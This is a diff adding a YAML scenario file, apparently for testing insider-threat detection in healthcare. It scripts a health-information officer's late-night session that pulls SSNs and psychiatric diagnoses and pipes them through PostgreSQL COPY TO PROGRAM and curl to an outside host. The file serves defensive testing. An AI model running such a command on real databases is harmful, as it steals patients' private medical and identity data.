@@ -1,0 +1,24 @@
+scenario_id: healthcare_him_officer_exfil_0012
+family_id: healthcare_him_officer_exfil_0012
+domain: healthcare
+time_of_day: 02:30
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: him_officer
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.3891751879762648
+  events:
+  - sql: SELECT p.full_name, p.ssn, p.address, m.diagnosis_code, m.diagnosis_notes FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id WHERE m.diagnosis_code LIKE 'F%' ORDER BY m.recorded_at
+      DESC
+  - step_id: exfil
+    sql: COPY (SELECT p.ssn, p.address, p.date_of_birth, m.diagnosis_notes FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id) TO PROGRAM 'curl -sX POST https://analytics.example.net/submit
+      -d @-'
+    connects_to:
+      ip: 185.100.87.41
+      port: 9443
